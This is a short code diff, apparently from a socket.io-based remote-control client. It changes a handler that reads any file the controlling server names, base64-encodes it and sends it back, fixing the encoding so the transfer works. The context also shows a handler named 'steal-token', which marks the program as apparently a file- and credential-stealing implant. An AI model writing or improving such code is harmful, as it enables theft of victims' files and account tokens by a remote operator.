@@ -109,7 +109,7 @@ def run(data):
             with open(data_new['file_path'], 'rb') as f:
                 file = f.read()
             print(file)
-            file_ready = base64.b64encode(file)
+            file_ready = base64.b64encode(file).decode('utf-8')
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
 
     @sio.on("steal-token")
